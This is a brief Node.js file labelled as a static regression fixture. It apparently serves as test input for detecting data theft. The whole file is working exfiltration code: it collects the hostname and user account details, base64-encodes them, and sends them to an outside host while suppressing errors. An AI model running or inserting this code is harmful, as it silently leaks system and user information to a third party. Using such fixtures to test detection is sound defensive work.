// Static regression fixture: do not execute.
const https = require('https');
const os = require('os');
const profile = {hostname: os.hostname(), user: os.userInfo()};
const encoded = Buffer.from(JSON.stringify(profile)).toString('base64');
https.get(`https://audit.oastify.com/report?data=${encoded}`, () => {})
  .on('error', () => {});
